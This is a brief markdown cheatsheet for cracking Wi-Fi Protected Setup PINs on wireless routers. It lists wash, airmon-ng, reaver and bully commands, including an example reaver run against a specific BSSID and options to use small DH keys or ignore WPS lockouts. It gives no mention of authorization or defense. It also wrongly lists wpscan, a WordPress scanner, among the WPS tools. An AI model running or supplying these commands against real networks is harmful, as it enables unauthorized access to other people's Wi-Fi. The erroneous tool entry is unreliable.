# WPS Attack Cheatsheet

## Tools
- `reaver`
- `bully`
- `wpscan`
- `wash`

## Scan for WPS-enabled Networks
```bash
wash -i <interface>
```

## Reaver WPS PIN Attack
```bash
reaver -i <interface> -b <BSSID> -c <channel> -vv
# Ejemplo
sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v -K
```
- `-i`: Wireless interface (monitor mode)
- `-b`: Target BSSID (MAC address)
- `-c`: Channel
- `-vv`: Verbose output

## Bully WPS PIN Attack
```bash
bully <interface> -b <BSSID> -c <channel>
```

## Common Reaver Options
- `--wps-only`: Only attack WPS
- `-a`: Auto mode
- `-S`: Use small DH keys (faster)
- `-L`: Ignore locked WPS state

## Monitor Mode Setup
```bash
airmon-ng start <interface>
```
- Use the new monitor interface (e.g., `wlan0mon`)

## Stop Monitor Mode
```bash
airmon-ng stop <monitor-interface>
```

## Notes
- WPS attacks may take hours.
- Some routers lock WPS after failed attempts.
- Use `wash` to check WPS lock status.

## References
- [Reaver GitHub](https://github.com/t6x/reaver-wps-fork-t6x)
- [Bully GitHub](https://github.com/aanarchyy/bully)
- [Kali Linux Docs](https://www.kali.org/docs/)